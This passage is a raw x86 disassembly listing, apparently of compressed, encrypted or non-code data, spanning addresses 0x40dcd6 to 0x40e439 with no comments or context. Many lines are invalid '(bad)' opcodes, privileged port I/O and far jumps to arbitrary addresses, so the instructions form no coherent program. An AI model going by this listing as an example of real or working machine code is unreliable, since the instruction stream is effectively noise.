  40dcd6:	fcom   QWORD PTR [edx-0x14]
  40dcd9:	jge    0x40dcd1
  40dcdb:	loopne 0x40dccc
  40dcdd:	ret    
  40dcde:	hlt    
  40dcdf:	sbb    BYTE PTR [edx+0x42],ch
  40dce2:	push   ds
  40dce3:	inc    ebx
  40dce4:	(bad)  
  40dce5:	jge    0x40dcf0
  40dce7:	jp     0x40dd36
  40dce9:	push   ebp
  40dcea:	rcr    DWORD PTR [ebx+edx*8-0x782c548],cl
  40dcf1:	mov    bh,0x7a
  40dcf3:	xchg   ebp,eax
  40dcf4:	in     eax,dx
  40dcf5:	mov    esi,0x5723e1bb
  40dcfa:	sub    BYTE PTR [ebp-0x73],0x7
  40dcfe:	idiv   BYTE PTR [ecx-0x5e]
  40dd01:	dec    ebx
  40dd02:	into   
  40dd03:	jecxz  0x40dca4
  40dd05:	and    BYTE PTR [edx-0x51],dh
  40dd08:	jmp    0x40dd3b
  40dd0a:	addr16 (bad) 
  40dd0c:	mov    ds:0x73dc406a,eax
  40dd11:	mov    edi,0x3e23b92
  40dd16:	arpl   WORD PTR [esi+0x54],si
  40dd19:	jecxz  0x40dd0a
  40dd1b:	or     eax,0x54f44688
  40dd20:	mov    edi,0x3dd97b69
  40dd25:	bnd jge 0x40dcc2
  40dd28:	mov    bl,0x5d
  40dd2a:	(bad)  
  40dd2b:	data16 fmul QWORD PTR [esi+0x71]
  40dd2f:	jnp    0x40dd03
  40dd31:	and    edi,DWORD PTR [ecx-0x7b]
  40dd34:	dec    BYTE PTR [esi-0x1ea4464c]
  40dd3a:	jb     0x40dd70
  40dd3c:	(bad)  
  40dd3d:	inc    eax
  40dd3e:	test   DWORD PTR [edi],ecx
  40dd40:	and    dh,BYTE PTR [eax-0x6ba0ade9]
  40dd46:	lahf   
  40dd47:	mov    ah,0xee
  40dd49:	popa   
  40dd4a:	cmc    
  40dd4b:	xchg   ecx,eax
  40dd4c:	mov    WORD PTR [edx],ss
  40dd4e:	mov    BYTE PTR [edi+0x7cb3cbb9],bh
  40dd54:	test   al,0x23
  40dd56:	cmp    DWORD PTR [esp+esi*8+0x7d],esp
  40dd5a:	(bad)  
  40dd5b:	int3   
  40dd5c:	fdiv   DWORD PTR [edx+esi*8-0x5595a51b]
  40dd63:	call   0x988817f2
  40dd68:	outs   dx,DWORD PTR ds:[esi]
  40dd69:	fdivr  DWORD PTR [eax]
  40dd6b:	push   ebx
  40dd6c:	in     eax,dx
  40dd6d:	out    0x5d,al
  40dd6f:	cmp    eax,0x26a14307
  40dd74:	mov    ch,0xfd
  40dd76:	xor    eax,0x9533a7e7
  40dd7b:	cmp    dh,bl
  40dd7d:	mov    dh,0x56
  40dd7f:	jmp    0x40dd97
  40dd81:	sti    
  40dd82:	adc    al,0x53
  40dd84:	jge    0x40dd2c
  40dd86:	jae    0x40dd30
  40dd88:	ror    BYTE PTR [edi-0x5dc52c71],1
  40dd8e:	retf   0x5ea0
  40dd91:	daa    
  40dd92:	neg    BYTE PTR [esi]
  40dd94:	mov    bh,0x33
  40dd96:	mov    cl,0x44
  40dd98:	inc    eax
  40dd99:	pop    edx
  40dd9a:	inc    ecx
  40dd9b:	inc    edx
  40dd9c:	lods   al,BYTE PTR ds:[esi]
  40dd9d:	int    0x7b
  40dd9f:	aas    
  40dda0:	inc    ebp
  40dda1:	add    eax,esi
  40dda3:	out    dx,al
  40dda4:	add    esp,DWORD PTR [esi-0x2f]
  40dda7:	jl     0x40dd34
  40dda9:	pop    es
  40ddaa:	pop    esp
  40ddab:	adc    DWORD PTR [ecx],ecx
  40ddad:	ret    0xa806
  40ddb0:	inc    ecx
  40ddb1:	and    eax,0x4db80475
  40ddb6:	popa   
  40ddb7:	scas   eax,DWORD PTR es:[edi]
  40ddb8:	dec    esp
  40ddb9:	mov    ch,0x5d
  40ddbb:	mov    ecx,0xab2605d1
  40ddc0:	or     edi,DWORD PTR [eax+eiz*4+0x0]
  40ddc4:	xor    dh,bh
  40ddc6:	push   ebp
  40ddc7:	test   DWORD PTR [eax],0x666e6a7f
  40ddcd:	sar    BYTE PTR [eax+ebx*4+0x5e],0xf2
  40ddd2:	gs xor eax,0xa252d16b
  40ddd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddd9:	je     0x40de59
  40dddb:	idiv   DWORD PTR [ecx]
  40dddd:	jnp    0x40ddc4
  40dddf:	sti    
  40dde0:	(bad)  
  40dde2:	pop    esp
  40dde3:	les    ebx,FWORD PTR [ecx+0x4]
  40dde6:	adc    edi,DWORD PTR [ebx+0x26]
  40dde9:	mov    dh,BYTE PTR [ecx-0x3]
  40ddec:	and    eax,0xb97802ba
  40ddf1:	ret    
  40ddf2:	int    0xdc
  40ddf4:	ds push ebx
  40ddf6:	sbb    ebx,eax
  40ddf8:	lea    ebx,[esi]
  40ddfa:	repz push esp
  40ddfd:	add    BYTE PTR [eax-0x360a72],bh
  40de03:	and    dh,BYTE PTR [eax+0x74]
  40de06:	sbb    ecx,ecx
  40de08:	call   0x6f9f:0xe774e6f8
  40de0f:	out    0x9,eax
  40de11:	fwait
  40de12:	retf   0xda31
  40de15:	adc    DWORD PTR [ecx-0x3],0xffffffd2
  40de19:	rcr    DWORD PTR [eax],cl
  40de1b:	fnstsw WORD PTR [esi]
  40de1d:	sub    edx,DWORD PTR [ecx]
  40de1f:	das    
  40de20:	fwait
  40de21:	adc    dl,al
  40de23:	in     al,dx
  40de24:	sahf   
  40de25:	call   0xbf5b7d46
  40de2a:	pop    esp
  40de2b:	sti    
  40de2c:	cld    
  40de2d:	je     0x40de3f
  40de2f:	lea    eax,[edi-0x7b]
  40de32:	xlat   BYTE PTR ds:[ebx]
  40de33:	jl     0x40de6e
  40de35:	inc    ebp
  40de36:	jmp    0x40de7a
  40de38:	adc    ebp,DWORD PTR [edi+esi*4+0x4ad9aa6f]
  40de3f:	mov    ah,0xfc
  40de41:	loop   0x40deb0
  40de43:	inc    bl
  40de45:	ret    
  40de46:	(bad)  
  40de48:	bound  edi,QWORD PTR [eax-0x6b]
  40de4b:	ret    0xea44
  40de4e:	psrlq  mm7,0xf0
  40de52:	retf   
  40de53:	adc    bl,ah
  40de55:	xchg   ebx,eax
  40de56:	mov    ebx,0xd5452b9f
  40de5b:	fimul  WORD PTR [esi+ebx*4]
  40de5e:	(bad)  
  40de5f:	jae    0x40ddfd
  40de61:	js     0x40de8b
  40de63:	lahf   
  40de64:	jo     0x40deb2
  40de66:	ja     0x40de4a
  40de68:	inc    edi
  40de69:	repnz adc eax,0xa4fc56d9
  40de6f:	fsubr  DWORD PTR [eax+0x3dd1bf87]
  40de75:	cld    
  40de76:	xor    eax,0x58cac342
  40de7b:	push   ebx
  40de7c:	mov    edi,0x8b3c9402
  40de81:	shr    DWORD PTR [esi+0x47],cl
  40de84:	push   ds
  40de85:	jmp    0x40deb2
  40de87:	sub    eax,0x69754aa1
  40de8c:	in     al,0xae
  40de8e:	add    eax,0xd1f87e22
  40de93:	inc    ecx
  40de94:	sbb    edi,eax
  40de96:	push   esp
  40de97:	push   ds
  40de98:	ins    BYTE PTR es:[edi],dx
  40de99:	fbld   TBYTE PTR [edx]
  40de9b:	xor    bh,0x14
  40de9e:	ins    DWORD PTR es:[edi],dx
  40de9f:	jmp    0x7ca3:0x684ba29
  40dea6:	push   ecx
  40dea7:	dec    edi
  40dea8:	jns    0x40de81
  40deaa:	mov    esi,0xf2455995
  40deaf:	dec    dx
  40deb1:	jg     0x40de3f
  40deb3:	jmp    0xcfbf24b5
  40deb8:	aam    0x7d
  40deba:	adc    BYTE PTR [ecx],0x46
  40debd:	jecxz  0x40decf
  40debf:	sahf   
  40dec0:	sar    DWORD PTR [edi-0x249bb8e5],1
  40dec6:	rcr    ecx,0xf3
  40dec9:	imul   edx,DWORD PTR [edx+edx*1-0x51],0xffffffcd
  40dece:	arpl   WORD PTR [esp+edx*4+0x6d1efdfb],bp
  40ded5:	bound  eax,QWORD PTR [ecx-0x2c]
  40ded8:	pop    ebp
  40ded9:	es dec ebx
  40dedb:	imul   edx,DWORD PTR [eax+0x6a],0x3b83fe11
  40dee2:	sub    eax,0x4f89bd98
  40dee7:	inc    DWORD PTR [esi+ebx*2+0x5a]
  40deeb:	iret   
  40deec:	or     ah,bl
  40deee:	stc    
  40deef:	xchg   edi,eax
  40def0:	addr16 dec ebx
  40def2:	xor    DWORD PTR [esp+edi*8-0x594cd965],ecx
  40def9:	rcl    BYTE PTR [edx+0x2c],0x65
  40defd:	inc    edx
  40defe:	div    BYTE PTR [ebp-0x1a]
  40df01:	ret    0xc8f4
  40df04:	push   ecx
  40df05:	jbe    0x40df1a
  40df07:	or     cl,BYTE PTR [ebx]
  40df09:	xchg   ebx,eax
  40df0a:	rol    ah,1
  40df0c:	aaa    
  40df0d:	aam    0x78
  40df0f:	(bad)  
  40df10:	sbb    al,0x4c
  40df12:	lock sbb al,0x32
  40df15:	adc    al,0xc
  40df17:	sbb    DWORD PTR [ebx+0x750a9072],edi
  40df1d:	jmp    0x8d452194
  40df22:	fnstenv [edx]
  40df24:	scas   eax,DWORD PTR es:[edi]
  40df25:	cmp    eax,0xb950776e
  40df2a:	retf   0x2c5f
  40df2d:	mov    ds:0xc61647ff,al
  40df32:	popf   
  40df33:	jns    0x40dfad
  40df35:	fcmove st,st(5)
  40df37:	or     ah,al
  40df39:	frstor [esp+esi*2+0x8]
  40df3d:	sbb    al,0x48
  40df3f:	sub    ecx,ebx
  40df41:	fldenv [ecx-0x3d5c200f]
  40df47:	(bad)  
  40df48:	cld    
  40df49:	and    eax,0xf149ad9d
  40df4e:	jo     0x40df44
  40df50:	inc    eax
  40df51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df52:	add    eax,0x6dc1d4ac
  40df57:	add    al,0x95
  40df59:	out    dx,eax
  40df5a:	push   cs
  40df5b:	cmc    
  40df5c:	adc    DWORD PTR [ebp-0x13],ebp
  40df5f:	retf   0xc717
  40df62:	gs jnp 0x40dfaf
  40df65:	xor    esi,DWORD PTR [edx+0x28be82]
  40df6b:	inc    ecx
  40df6c:	lds    edx,FWORD PTR [eax-0x78]
  40df6f:	jbe    0x40df67
  40df71:	adc    al,BYTE PTR [eax+0x79]
  40df74:	xchg   BYTE PTR [edi],dh
  40df76:	cli    
  40df77:	iret   
  40df78:	mov    al,0x99
  40df7a:	fadd   QWORD PTR [edx-0x5]
  40df7d:	and    al,0x47
  40df7f:	(bad)
  40df82:	or     BYTE PTR [edi+0x69],0xcd
  40df86:	dec    ebx
  40df87:	sbb    al,0x3e
  40df89:	dec    eax
  40df8a:	ss aad 0xe5
  40df8d:	sbb    ch,0xd3
  40df90:	inc    ebx
  40df91:	push   edi
  40df92:	fmul   QWORD PTR [esi+edx*2]
  40df95:	pop    esp
  40df96:	adc    eax,0xf7397f29
  40df9b:	jle    0x40dfde
  40df9d:	jl     0x40df23
  40df9f:	ror    DWORD PTR [ebx+0x62],1
  40dfa2:	adc    BYTE PTR [ecx+0xf],0xb0
  40dfa6:	mov    BYTE PTR [edi+0x69],bl
  40dfa9:	sub    eax,0x7aefd11
  40dfae:	lods   eax,DWORD PTR ds:[esi]
  40dfaf:	sub    dl,dh
  40dfb1:	scas   al,BYTE PTR es:[edi]
  40dfb2:	push   ss
  40dfb3:	cs dec edi
  40dfb5:	or     ebp,ecx
  40dfb7:	xchg   DWORD PTR [eax],edx
  40dfb9:	inc    ebx
  40dfba:	add    al,0xc4
  40dfbc:	adc    eax,eax
  40dfbe:	xchg   esp,eax
  40dfbf:	jbe    0x40dfb7
  40dfc1:	add    edx,edi
  40dfc3:	dec    BYTE PTR [edx-0x29]
  40dfc6:	leave  
  40dfc7:	test   DWORD PTR [esi+0x2583b6f7],esp
  40dfcd:	hlt    
  40dfce:	clc    
  40dfcf:	mov    ?,WORD PTR [edx]
  40dfd1:	xor    edi,DWORD PTR [ebp+0x4c2d348d]
  40dfd7:	mov    BYTE PTR [ebp+0x44],bh
  40dfda:	dec    edx
  40dfdb:	or     al,BYTE PTR [edx+0x4d]
  40dfde:	mov    BYTE PTR [eax+eax*4],dh
  40dfe1:	pop    esi
  40dfe2:	addr16 into 
  40dfe4:	sbb    bl,BYTE PTR [eax+0x8238238]
  40dfea:	ss icebp 
  40dfec:	pushf  
  40dfed:	ja     0x40dfe2
  40dfef:	jno    0x40e015
  40dff1:	scas   eax,DWORD PTR es:[edi]
  40dff2:	clc    
  40dff3:	dec    esp
  40dff4:	adc    al,0xc8
  40dff6:	mov    cl,0x6c
  40dff8:	outs   dx,DWORD PTR ds:[esi]
  40dff9:	cmp    bl,BYTE PTR [esi]
  40dffb:	aas    
  40dffc:	daa    
  40dffd:	sub    BYTE PTR [esi+0x13c83933],cl
  40e003:	pop    ebp
  40e004:	mov    eax,ds:0xdbd39e91
  40e009:	test   DWORD PTR [eax+0x1c],esi
  40e00c:	push   0xed4c140
  40e011:	loope  0x40e07f
  40e013:	xabort 0xa8
  40e016:	push   ebp
  40e017:	push   0x550c2fd5
  40e01c:	or     DWORD PTR [edx+0x56],0xb9e198fd
  40e023:	mov    eax,0xda8a2aeb
  40e028:	call   0x8627:0xc8b01b9f
  40e02f:	cmc    
  40e030:	ret    0xa576
  40e033:	sbb    al,0xdd
  40e035:	xor    BYTE PTR [ebx-0x30],ch
  40e038:	mov    dl,cl
  40e03a:	inc    ecx
  40e03b:	cmc    
  40e03c:	retf   
  40e03d:	pop    ebx
  40e03e:	shr    BYTE PTR [eax-0x537d6bfb],cl
  40e044:	sub    al,0x9
  40e046:	addr16 inc esi
  40e048:	or     BYTE PTR [di-0x1d6b],0x81
  40e04e:	pop    ds
  40e04f:	mov    dh,0x75
  40e051:	jae    0x40e018
  40e053:	or     DWORD PTR [edi+0x3],ecx
  40e056:	into   
  40e057:	cmp    dl,BYTE PTR [ecx+0x7a]
  40e05a:	mov    eax,ds:0x702c35e4
  40e05f:	adc    edx,ebx
  40e061:	test   esi,esi
  40e063:	dec    esi
  40e064:	test   BYTE PTR [edx-0x60179e66],bh
  40e06a:	mov    dl,0x11
  40e06c:	enter  0xee1a,0xd1
  40e070:	popf   
  40e071:	aaa    
  40e072:	inc    esp
  40e073:	clc    
  40e074:	mov    edx,0x28714c3e
  40e079:	sbb    eax,0xd89fcfba
  40e07e:	arpl   bp,di
  40e080:	xchg   ecx,eax
  40e081:	iret   
  40e082:	xchg   ecx,eax
  40e083:	aam    0xf8
  40e085:	push   ebp
  40e086:	and    eax,0x6507115f
  40e08b:	push   0xffffff9b
  40e08d:	xchg   edx,edx
  40e08f:	xchg   ebp,eax
  40e090:	push   edx
  40e091:	xchg   ecx,eax
  40e092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e093:	xor    ecx,DWORD PTR [ebp+0x7b43408e]
  40e099:	loop   0x40e03b
  40e09b:	inc    ebx
  40e09c:	shr    DWORD PTR [edx],0x2b
  40e09f:	sub    BYTE PTR [esi-0x21],bh
  40e0a2:	inc    edi
  40e0a3:	outs   dx,BYTE PTR ds:[esi]
  40e0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0a5:	popa   
  40e0a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0a7:	repz xchg edi,eax
  40e0a9:	in     eax,0x7c
  40e0ab:	dec    ebx
  40e0ac:	ror    DWORD PTR [edx-0x60],cl
  40e0af:	adc    al,0xc8
  40e0b1:	aaa    
  40e0b2:	ja     0x40e126
  40e0b4:	and    DWORD PTR [eax-0x10],0xcb66a8d1
  40e0bb:	lock jae 0x40e132
  40e0be:	fistp  QWORD PTR ds:[ebx+0x582190ce]
  40e0c5:	jae    0x40e052
  40e0c7:	or     ebx,0xffffffdb
  40e0ca:	cmp    eax,0xa959643f
  40e0cf:	sbb    al,0x2c
  40e0d1:	jns    0x40e145
  40e0d3:	mov    cl,0x13
  40e0d5:	fs dec ecx
  40e0d7:	and    DWORD PTR cs:[edi+0xc],esi
  40e0db:	adc    eax,0x7fe17c56
  40e0e0:	enter  0x3a0c,0x85
  40e0e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0e5:	mov    eax,ds:0xf225d95f
  40e0ea:	mov    edx,0xae4c0a7c
  40e0ef:	xchg   ebp,eax
  40e0f0:	mov    cl,0x25
  40e0f2:	mov    esi,0x58e2fdb7
  40e0f7:	es ret 
  40e0f9:	mov    esp,0x1f3aa32a
  40e0fe:	sti    
  40e0ff:	adc    BYTE PTR [ebp+0x461f66cf],bh
  40e105:	xchg   esi,eax
  40e106:	sub    eax,ecx
  40e108:	inc    edx
  40e109:	sbb    dl,ah
  40e10b:	sbb    DWORD PTR [ecx],edi
  40e10d:	dec    esi
  40e10e:	mov    WORD PTR [ecx+0x4ea0276d],gs
  40e114:	inc    ecx
  40e115:	cmc    
  40e116:	sub    DWORD PTR [edi-0x75],edx
  40e119:	in     al,dx
  40e11a:	pop    eax
  40e11b:	leave  
  40e11c:	or     edx,DWORD PTR [edi+0x7995855]
  40e122:	(bad)  
  40e123:	sbb    BYTE PTR ds:0x7724f34,bl
  40e129:	call   DWORD PTR [eax+0x4903f23]
  40e12f:	aad    0xb3
  40e131:	int3   
  40e132:	lods   eax,DWORD PTR ds:[esi]
  40e133:	(bad)  
  40e134:	mov    ebx,0x8b24281a
  40e139:	lods   al,BYTE PTR ds:[esi]
  40e13a:	jle    0x40e0db
  40e13c:	adc    BYTE PTR [eax],cl
  40e13e:	stos   BYTE PTR es:[edi],al
  40e13f:	mov    ch,0x92
  40e142:	test   bh,cl
  40e144:	das    
  40e145:	sbb    ch,dl
  40e147:	into   
  40e148:	pop    ss
  40e149:	ins    DWORD PTR es:[edi],dx
  40e14a:	cmc    
  40e14b:	fadd   DWORD PTR [ebp+0x5e]
  40e14e:	int    0x9c
  40e150:	(bad)  
  40e151:	mov    ds:0x4d91a31c,eax
  40e156:	dec    ecx
  40e157:	int3   
  40e158:	add    bh,BYTE PTR [ebx+0x5e237b8e]
  40e15e:	xchg   ecx,eax
  40e15f:	add    BYTE PTR [eax+0x41d0e086],al
  40e165:	ins    BYTE PTR es:[edi],dx
  40e166:	mov    ds:0x12c643f7,eax
  40e16b:	push   esi
  40e16c:	arpl   bp,ax
  40e16e:	and    DWORD PTR [eax+0x5b],0xffffffb4
  40e172:	jne    0x40e1df
  40e174:	xor    eax,0x6d9aac7e
  40e179:	fcom   QWORD PTR [ecx+0x7d]
  40e17c:	cld    
  40e17d:	cld    
  40e17e:	jmp    0xb20c467a
  40e183:	scas   al,BYTE PTR es:[edi]
  40e184:	sub    ch,BYTE PTR [ebx+ebp*2-0x1cf95e5e]
  40e18b:	loopne 0x40e10f
  40e18d:	xchg   edx,eax
  40e18e:	in     al,0xd6
  40e190:	fdiv   st(3),st
  40e192:	sub    edx,DWORD PTR [eax+edx*1]
  40e195:	jbe    0x40e1d9
  40e197:	in     al,dx
  40e198:	or     esi,DWORD PTR [ebx+0x2ff9a904]
  40e19e:	std    
  40e19f:	add    BYTE PTR [eax-0x76],ch
  40e1a2:	stos   DWORD PTR es:[edi],eax
  40e1a3:	sub    bh,BYTE PTR [edx+edx*2+0x3c]
  40e1a7:	mov    BYTE PTR [edi],ch
  40e1a9:	xchg   edi,eax
  40e1aa:	add    dl,BYTE PTR [edx-0x41]
  40e1ad:	scas   al,BYTE PTR es:[edi]
  40e1ae:	rol    DWORD PTR [edi],0xcd
  40e1b1:	inc    ebx
  40e1b2:	je     0x40e22c
  40e1b4:	neg    BYTE PTR [eax]
  40e1b6:	cwde   
  40e1b7:	call   0x9b63:0xcabc019
  40e1be:	and    DWORD PTR [edi+0x37],0x79d28a02
  40e1c5:	arpl   WORD PTR ds:0x2e1142f8,cx
  40e1cb:	mov    ah,0xcf
  40e1cd:	out    dx,al
  40e1ce:	leave  
  40e1cf:	mov    ds:0x8e7b96fe,al
  40e1d4:	dec    ebp
  40e1d5:	and    al,0x14
  40e1d7:	ja     0x40e1e1
  40e1d9:	outs   dx,BYTE PTR ds:[esi]
  40e1da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1db:	mov    al,0xf3
  40e1dd:	jne    0x40e18e
  40e1df:	lahf   
  40e1e0:	jmp    0xdd85c6dd
  40e1e5:	aam    0xf8
  40e1e7:	push   ecx
  40e1e8:	xor    al,0xe
  40e1ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1eb:	mov    edi,0x645e0059
  40e1f0:	shl    BYTE PTR [ecx-0x4],0xac
  40e1f4:	cmp    ch,cl
  40e1f6:	(bad)  
  40e1f7:	sbb    al,0x58
  40e1f9:	push   0x7a09f73c
  40e1fe:	sub    BYTE PTR ss:[edx+0x696dbc09],al
  40e205:	push   esp
  40e206:	(bad)  [ebx]
  40e208:	into   
  40e209:	cs cmp eax,0xcbae271c
  40e20f:	sub    DWORD PTR [edx+0x64834240],0x198de6a2
  40e219:	pop    ds
  40e21a:	cmp    BYTE PTR [edi+0x76],cl
  40e21d:	icebp  
  40e21e:	pop    edx
  40e21f:	cmp    eax,0xebc76036
  40e224:	xchg   ecx,eax
  40e225:	adc    esi,ebx
  40e227:	jecxz  0x40e1fe
  40e229:	dec    ebp
  40e22a:	jno    0x40e220
  40e22c:	test   BYTE PTR ds:0xc2fc2035,0xc9
  40e233:	xchg   esi,eax
  40e234:	xchg   esp,eax
  40e235:	and    cl,BYTE PTR ds:0x17c0e75a
  40e23b:	dec    esp
  40e23c:	pop    edi
  40e23d:	scas   al,BYTE PTR es:[edi]
  40e23e:	repnz sub al,0xd
  40e241:	(bad)  
  40e242:	gs call 0xeae92959
  40e248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e249:	mov    ss,ecx
  40e24b:	cli    
  40e24c:	rcl    DWORD PTR [esi+0x3f346daa],0xd3
  40e253:	sar    ch,cl
  40e255:	inc    esp
  40e256:	sbb    al,0xb5
  40e258:	jmp    0x16c200ec
  40e25d:	aam    0x85
  40e25f:	gs dec edx
  40e261:	(bad)
  40e265:	js     0x40e246
  40e267:	hlt    
  40e268:	dec    eax
  40e269:	add    dl,dl
  40e26b:	sti    
  40e26c:	je     0x40e223
  40e26e:	push   edi
  40e26f:	sub    bl,ah
  40e271:	mov    ds:0x1cd05a24,eax
  40e276:	pop    edi
  40e277:	ror    BYTE PTR [edx+0x74],0x27
  40e27b:	pop    es
  40e27c:	sahf   
  40e27d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e27e:	dec    ebx
  40e27f:	sbb    al,0xd6
  40e281:	ret    0xc5f
  40e284:	sti    
  40e285:	mov    ?,WORD PTR [esi+0x779aef2e]
  40e28b:	inc    esp
  40e28c:	xchg   ebx,eax
  40e28d:	or     al,0x74
  40e28f:	jmp    0x40e2ef
  40e291:	mov    ebp,0xee70b734
  40e296:	imul   esp,DWORD PTR [edx-0x59028a2c],0xfffffff8
  40e29d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e29e:	push   ecx
  40e29f:	stc    
  40e2a0:	mov    ss,WORD PTR [edx+edx*8+0x76]
  40e2a4:	enter  0x3734,0x3c
  40e2a8:	outs   dx,DWORD PTR ds:[si]
  40e2aa:	mov    ch,0x49
  40e2ac:	xor    BYTE PTR [esi-0x79],al
  40e2af:	cmp    al,BYTE PTR [ecx]
  40e2b1:	sub    dl,BYTE PTR [ecx]
  40e2b3:	(bad)  
  40e2b4:	aas    
  40e2b5:	retf   
  40e2b6:	sbb    ecx,DWORD PTR [ecx-0x99163e8]
  40e2bc:	jmp    0x461d:0xc59a2d19
  40e2c3:	jno    0x40e2e2
  40e2c5:	push   edi
  40e2c6:	jg     0x40e2a0
  40e2c8:	sub    ch,BYTE PTR [edi-0x25]
  40e2cb:	ret    0xfcd9
  40e2ce:	je     0x40e2cb
  40e2d0:	ret    0xeeec
  40e2d3:	xor    eax,0xf34903ff
  40e2d8:	add    eax,0x1efdcc16
  40e2dd:	sbb    cl,dl
  40e2df:	jns    0x40e311
  40e2e1:	and    eax,0x97a1318f
  40e2e6:	and    DWORD PTR [eax],0xffffffcc
  40e2e9:	mov    ah,0x47
  40e2eb:	add    DWORD PTR [ebx+0xc],ebp
  40e2ee:	lds    edx,FWORD PTR [ecx-0x54219d80]
  40e2f4:	pusha  
  40e2f5:	loope  0x40e27f
  40e2f7:	pusha  
  40e2f8:	mov    WORD PTR [ebp-0x56a167c2],gs
  40e2fe:	add    BYTE PTR [eax],ah
  40e300:	xchg   ebx,eax
  40e301:	mov    dh,0xe7
  40e303:	fdiv   DWORD PTR [edx+0x67f5f3e5]
  40e309:	repnz mov ebx,0x33e9c90e
  40e30f:	pop    fs
  40e311:	imul   eax,ebp,0x6696bb07
  40e317:	sbb    cl,cl
  40e319:	and    esi,ecx
  40e31b:	cmp    bl,BYTE PTR [esi-0xa2cb4a3]
  40e321:	xlat   BYTE PTR es:[ebx]
  40e323:	fdiv   QWORD PTR [edx-0x3ac90cc2]
  40e329:	xchg   ebx,eax
  40e32a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e32b:	in     al,0xcc
  40e32d:	int    0xfb
  40e32f:	or     al,0xd0
  40e331:	imul   esp,DWORD PTR [ecx-0x6c],0x65
  40e335:	pusha  
  40e336:	lds    ecx,FWORD PTR [edx+0x2c]
  40e339:	adc    bl,BYTE PTR ds:0x575cd6a0
  40e33f:	data16 fcomp st(7)
  40e342:	dec    ebp
  40e343:	and    al,0xec
  40e345:	enter  0x7e5,0x82
  40e349:	jmp    0x8be5e3f6
  40e34e:	mov    ecx,eax
  40e350:	xor    esi,DWORD PTR [eax]
  40e352:	pop    ds
  40e353:	push   ds
  40e354:	push   ebp
  40e355:	or     BYTE PTR [ebx-0x2d973ba2],bh
  40e35b:	xor    eax,0xd7915a70
  40e360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e361:	cli    
  40e362:	add    cl,BYTE PTR [ebx]
  40e364:	clc    
  40e365:	ins    BYTE PTR es:[edi],dx
  40e366:	in     al,0x2c
  40e368:	push   ss
  40e369:	push   eax
  40e36a:	cmp    eax,0x7f5bfa79
  40e36f:	loop   0x40e3ac
  40e371:	adc    eax,0x5cb1d511
  40e376:	xchg   edi,eax
  40e377:	aas    
  40e378:	ret    0x6197
  40e37b:	jbe    0x40e3eb
  40e37d:	dec    edx
  40e37e:	inc    eax
  40e37f:	jbe    0x40e334
  40e381:	jbe    0x40e3f7
  40e383:	pop    esi
  40e384:	pop    ss
  40e385:	xor    BYTE PTR [ecx],0x46
  40e388:	xchg   ecx,eax
  40e389:	jae    0x40e3e3
  40e38b:	xchg   ecx,eax
  40e38c:	pop    esp
  40e38d:	and    bh,BYTE PTR [eax-0x18]
  40e390:	arpl   di,bp
  40e392:	leave  
  40e393:	les    ebx,FWORD PTR [ebp-0x19]
  40e396:	in     al,dx
  40e397:	aas    
  40e398:	ss mov eax,eax
  40e39b:	pop    esi
  40e39c:	add    edx,DWORD PTR [ebx]
  40e39e:	(bad)  
  40e39f:	(bad)  [edi+edx*1]
  40e3a2:	mov    ds:0x58235b50,eax
  40e3a7:	jbe    0x40e3ae
  40e3a9:	pop    ss
  40e3aa:	sbb    DWORD PTR [edi],ebp
  40e3ac:	xchg   esp,eax
  40e3ad:	mov    bl,0x21
  40e3af:	or     ch,BYTE PTR [eax]
  40e3b1:	mov    bh,BYTE PTR [edi]
  40e3b3:	push   ebp
  40e3b4:	je     0x40e3b2
  40e3b6:	pop    esi
  40e3b7:	pop    edi
  40e3b8:	test   al,0xa1
  40e3ba:	inc    esp
  40e3bb:	rcr    BYTE PTR [ebp-0x7e],cl
  40e3be:	mov    ah,0x10
  40e3c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3c1:	pop    ebx
  40e3c2:	dec    ecx
  40e3c3:	push   0x23d1c222
  40e3c8:	push   ebx
  40e3c9:	pushf  
  40e3ca:	push   ebx
  40e3cb:	jg     0x40e38b
  40e3cd:	imul   edi,edi,0xffffffb3
  40e3d0:	fdivr  DWORD PTR [ecx+0x48]
  40e3d3:	hlt    
  40e3d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3d5:	cmp    ecx,ecx
  40e3d7:	pushf  
  40e3d8:	sar    BYTE PTR [eax-0x66814a68],cl
  40e3de:	cmp    al,0xd2
  40e3e0:	out    0x92,eax
  40e3e2:	inc    BYTE PTR [edi+0x4f]
  40e3e5:	mov    al,ds:0x1751829b
  40e3ea:	mov    esp,0x486041d9
  40e3ef:	xchg   BYTE PTR [ebp-0x30],dh
  40e3f2:	pop    ss
  40e3f3:	inc    esi
  40e3f4:	jle    0x40e42e
  40e3f6:	sbb    ch,al
  40e3f8:	or     BYTE PTR [edi+0x2ec26645],bl
  40e3fe:	jg     0x40e386
  40e400:	or     eax,edx
  40e402:	jnp    0x40e3cf
  40e404:	into   
  40e405:	pop    ecx
  40e406:	pop    ebp
  40e407:	push   edi
  40e408:	rcl    BYTE PTR [esi],1
  40e40a:	xchg   BYTE PTR [eiz*8+0x45da855d],ch
  40e411:	cdq    
  40e412:	ret    
  40e413:	test   BYTE PTR [esi],cl
  40e415:	xchg   BYTE PTR [esi-0x7e],al
  40e418:	(bad)  
  40e419:	mov    edi,0x74512de1
  40e41e:	adc    ebp,DWORD PTR [edi-0x62]
  40e421:	xor    al,cl
  40e423:	xchg   ebx,eax
  40e424:	jmp    0x3a441456
  40e429:	stos   DWORD PTR es:[edi],eax
  40e42a:	jge    0x40e43d
  40e42c:	mov    WORD PTR [ebp-0x6f03d158],?
  40e432:	cdq    
  40e433:	retf   
  40e434:	cs adc al,0x8f
  40e437:	mov    cl,0x6d
  40e439:	jo     0x40e3fd
